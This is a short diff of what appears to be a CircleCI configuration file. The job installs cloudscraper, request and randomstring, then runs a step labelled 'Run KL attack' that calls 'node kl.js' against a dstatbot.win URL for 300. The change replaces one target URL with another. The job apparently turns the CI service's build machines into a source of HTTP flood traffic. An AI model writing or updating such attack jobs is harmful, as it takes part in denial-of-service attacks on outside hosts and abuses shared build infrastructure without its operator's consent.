@@ -19,7 +19,7 @@ jobs:
             npm install cloudscraper request randomstring
       - run:
           name: Run KL attack
-          command: node kl.js https://c2.dstatbot.win/352db00b-5f01-4bc1-b414-8c7e4c127cf4 300 
+          command: node kl.js https://c4.dstatbot.win/de83d33b-35c6-4f41-83b7-62e80b60bbae 300 
 
 workflows:
   version: 2
